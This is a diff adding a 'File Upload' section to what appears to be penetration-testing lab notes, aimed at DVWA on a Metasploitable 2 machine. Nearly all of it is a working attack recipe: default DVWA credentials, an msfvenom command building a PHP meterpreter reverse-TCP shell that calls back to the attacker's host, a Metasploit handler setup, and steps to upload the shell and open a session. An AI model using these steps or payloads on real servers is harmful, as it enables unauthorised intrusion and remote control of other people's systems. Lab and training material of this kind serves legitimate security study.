@@ -87,6 +87,38 @@ If Windows
 
 ```
 
+#### File Upload
+```bash
+Web server allows attackers to upload files to its filesystem without proper validation like name, type, contents or size. Due to this improper validation type of files getting uploaded, an attacker will be able to upload malicious files.
+
+**Commands**
+DVWA cred's =>
+username - admin
+passwd - password
+
+In parrot browser > http://192.168.1.7/dvwa 
+[Note :- make sure to set DVWA script security to LOW]
+
+New terminal
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=9999 --platform php -o Desktop/upload.php
+
+New terminal
+msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.1.9
+set LPORT 9999
+exploit -j
+
+upload the "upload.php" file in dvwa upload vuln., once file is uploaded copy the full path and in URL remove # & paste the path & hit enter
+#If the process is unclear, check the below PoC
+come back to msfconsole & hit enter once
+sessions
+sessions -i 1
+	> sysinfo
+
+[Note :- 192.168.1.7 is Meta 2 ip] [Note :- 192.168.1.9 is parrot ip]
 
 
+```
 
